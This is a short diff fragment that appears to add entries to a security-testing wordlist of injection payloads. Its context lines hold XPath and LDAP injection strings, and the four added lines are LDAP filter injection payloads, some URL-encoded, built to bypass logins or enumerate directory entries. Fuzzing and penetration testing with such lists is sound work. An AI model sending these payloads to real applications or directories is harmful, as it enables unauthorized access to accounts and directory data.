@@ -24,3 +24,7 @@ x' or name()='username' or 'x'='y
 admin*
 admin*)((|userpassword=*)
 *)(uid=*))(|(uid=*
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+*()|%26'
